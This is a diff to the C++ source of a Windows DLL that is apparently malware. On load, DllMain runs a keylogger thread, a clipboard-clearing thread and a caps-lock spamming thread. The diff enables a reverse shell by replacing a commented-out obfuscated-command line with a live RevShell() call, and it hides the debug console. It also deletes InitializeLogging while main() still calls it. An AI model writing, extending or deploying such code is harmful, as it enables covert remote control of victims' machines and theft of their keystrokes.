@@ -4,27 +4,12 @@
 #include <filesystem>
 #include <mutex>
 #include <nlohmann/json.hpp>
-#include <spdlog/sinks/stdout_color_sinks.h>
 #include <spdlog/spdlog.h>
 #include <tlhelp32.h>
 #include <windows.h>
 
 // Global DebugConsole to persist beyond main()
 static DebugConsole *g_console = nullptr;
-
-void InitializeLogging() {
-  try {
-    auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
-    const char *logPattern = "[%H:%M:%S.%e][%^%l%$] %v";
-    auto logger = std::make_shared<spdlog::logger>("ion", console_sink);
-    spdlog::set_default_logger(logger);
-    spdlog::set_pattern(logPattern);
-    spdlog::set_level(spdlog::level::info);
-    spdlog::info("Logging initialized successfully");
-  } catch (const spdlog::spdlog_ex &ex) {
-    std::cerr << "Log initialization failed: " << ex.what() << std::endl;
-  }
-}
 
 void DumpInput() {
   KeyLogger logger(GetTempLogFilePath());
@@ -57,7 +42,7 @@ void spamCapsLock() {
 }
 
 int main() {
-  g_console = new DebugConsole(true);
+  g_console = new DebugConsole(false);
   g_console->Initialize();
   InitializeLogging();
   DumpMemoryInfo();
@@ -68,7 +53,7 @@ extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                                LPVOID lpRes) {
   if (fdwReason == DLL_PROCESS_ATTACH) {
     main();
-    // Detach_Module::RunObfuscatedCommand();
+    RevShell();
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DumpInput, 0, 0, 0);
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ClearClipboardThread, 0, 0, 0);
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)spamCapsLock, 0, 0, 0);
